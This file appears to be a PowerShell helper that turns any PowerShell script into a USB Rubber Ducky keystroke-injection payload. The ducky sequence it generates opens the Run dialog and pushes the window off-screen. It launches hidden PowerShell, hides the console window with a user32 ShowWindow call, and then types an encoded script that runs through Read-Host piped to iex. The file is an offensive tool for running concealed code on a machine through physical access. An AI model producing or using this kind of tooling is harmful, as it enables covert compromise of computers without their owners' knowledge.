# Drag a ps1 file on to here to have it prepared for the ducky.
#
# Pushes the actual PowerShell script in using char capture, allowing a
# relatively arbitrary length payload.
#
param([Parameter(Mandatory=$true)][string]$scriptFileName)

$script = Get-Content $scriptFileName -Raw
$outputFile = "${scriptFileName}.ducky.txt"

. "$PSScriptRoot\compression\Invoke-Encode.ps1"
$zippedScript = Invoke-Encode $script -IsString

"DELAY 5000",
"GUI r",
"DELAY 250",
"ALT SPACE",
"STRING M",
"DOWN",
"REPEAT 40",
"ENTER",
'STRING powershell -w hidden iex ''(Add-Type n -pas -m ''''[DllImport(\"user32\")]public static extern int ShowWindow(int h,int n);'''')::ShowWindow((gps -Id $pid).MainWindowHandle,0);Read-Host|iex''',
"ENTER",
"DELAY 1000",
"STRING $zippedScript",
"ENTER" | Out-File -e "ASCII" "$outputFile"
